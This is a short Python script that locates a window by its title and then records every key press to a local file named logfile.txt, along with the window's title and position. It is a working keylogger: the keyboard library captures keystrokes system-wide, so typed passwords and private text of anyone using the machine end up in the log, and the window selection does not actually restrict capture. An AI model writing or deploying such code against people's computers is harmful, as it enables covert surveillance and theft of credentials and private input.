import pygetwindow as gw
import pyautogui
import keyboard
import time

def log_keystrokes(window):
    with open('logfile.txt', 'a') as f:
        f.write(f"Window Title: {window.title}\n")
        f.write(f"Window Position: ({window.left}, {window.top})\n")
        f.write("Keystrokes:\n")

        while True:
            key_event = keyboard.read_event()
            if key_event.event_type == keyboard.KEY_DOWN:
                if key_event.name == 'enter':
                    f.write('\n')
                else:
                    f.write(key_event.name)
                    f.flush()

if __name__ == "__main__":
    target_window_title = "TODO"  # Replace with your target window title

    try:
        notepad_window = gw.getWindowsWithTitle(target_window_title)[0]
        print(f"Found window: {notepad_window.title}")

        log_keystrokes(notepad_window)
    except IndexError:
        print("Window not found.")
    except KeyboardInterrupt:
        print("Logging stopped.")
